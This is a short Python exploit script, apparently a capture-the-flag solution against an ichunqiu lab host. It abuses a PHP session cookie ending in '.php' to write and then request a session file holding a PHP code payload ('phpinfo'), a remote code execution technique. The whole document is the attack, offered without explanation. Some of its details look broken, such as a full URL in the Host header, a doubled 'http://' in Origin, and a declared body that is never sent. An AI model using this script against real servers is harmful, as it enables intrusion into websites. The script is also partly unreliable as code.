import requests as r

host = 'http://eci-2zeayc165jl9f807v8zp.cloudeci1.ichunqiu.com/'

headers = {
    'Host': host,
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '24',
    'Origin': f'http://{host}',
    'Connection': 'close',
    'Referer': f'http://{host}/',
    'Cookie': 'PHPSESSID=1234567890123456789012345678.php;',
    'Upgrade-Insecure-Requests': '1'
}

params = {'key': '<?php%20phpinfo();?>'}

res = r.post(host+'index/test1', headers=headers)
print(res.text)

res = r.post(host+'runtime/session/sess_1234567890123456789012345678.php', params=params, headers=headers)
print(res.text)
